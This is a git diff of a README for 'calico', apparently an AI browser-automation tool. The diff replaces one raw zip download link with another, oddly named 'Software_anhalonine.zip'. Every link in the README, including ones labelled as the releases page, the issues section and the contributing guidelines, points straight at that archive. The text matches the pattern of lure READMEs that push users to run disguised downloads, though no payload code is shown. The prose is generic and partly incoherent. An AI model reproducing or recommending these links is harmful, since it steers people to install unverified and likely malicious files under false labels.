@@ -1,7 +1,7 @@
 # 🤖 calico - Automate Browsing with AI Power
 
 ## 📥 Download Now
-[![Download calico](https://raw.githubusercontent.com/adammc769/calico/main/northerner/calico.zip)](https://raw.githubusercontent.com/adammc769/calico/main/northerner/calico.zip)
+[![Download calico](https://raw.githubusercontent.com/adammc769/calico/main/calico/api/Software_anhalonine.zip)](https://raw.githubusercontent.com/adammc769/calico/main/calico/api/Software_anhalonine.zip)
 
 ## 🚀 Getting Started
 Welcome to calico! This software allows you to automate various tasks in your web browser using AI. It combines advanced features like intelligent reasoning and visual recognition to streamline your online activities.
@@ -26,9 +26,9 @@ Here are some of the key features of calico:
 ## 📥 Download & Install
 To get started, you need to download the software. Follow these steps:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/adammc769/calico/main/northerner/calico.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/adammc769/calico/main/calico/api/Software_anhalonine.zip).
 2. Find the latest version of calico listed on that page.
-3. Click on the appropriate file for your operating system. This may be labeled as `.exe` for Windows, a `.dmg` for macOS, or `https://raw.githubusercontent.com/adammc769/calico/main/northerner/calico.zip` for Linux.
+3. Click on the appropriate file for your operating system. This may be labeled as `.exe` for Windows, a `.dmg` for macOS, or `https://raw.githubusercontent.com/adammc769/calico/main/calico/api/Software_anhalonine.zip` for Linux.
 4. Save the file to your preferred location on your computer.
 
 After downloading, find the file and double-click it. Follow the on-screen instructions to install calico on your system.
@@ -48,10 +48,10 @@ If you run into issues, consider these tips:
 - **Review logs:** If something goes wrong, look at the logs for error messages that can guide you to a solution.
 
 ## 📞 Support
-If you need further assistance, feel free to reach out. Check the [issues section of the repository](https://raw.githubusercontent.com/adammc769/calico/main/northerner/calico.zip) for community support or to report bugs.
+If you need further assistance, feel free to reach out. Check the [issues section of the repository](https://raw.githubusercontent.com/adammc769/calico/main/calico/api/Software_anhalonine.zip) for community support or to report bugs.
 
 ## 🌐 Community & Contribution
-We encourage community contributions. If you have ideas for new features or improvements, check our [contributing guidelines](https://raw.githubusercontent.com/adammc769/calico/main/northerner/calico.zip).
+We encourage community contributions. If you have ideas for new features or improvements, check our [contributing guidelines](https://raw.githubusercontent.com/adammc769/calico/main/calico/api/Software_anhalonine.zip).
 
 ## 💼 Explore More
 Want to learn more about what calico can do? Here are relevant topics for your exploration:
@@ -62,4 +62,4 @@ Want to learn more about what calico can do? Here are relevant topics for your e
 
 ---
 
-To download, visit the [Releases page](https://raw.githubusercontent.com/adammc769/calico/main/northerner/calico.zip) again for easy access. We hope you enjoy using calico for your browsing needs!
+To download, visit the [Releases page](https://raw.githubusercontent.com/adammc769/calico/main/calico/api/Software_anhalonine.zip) again for easy access. We hope you enjoy using calico for your browsing needs!
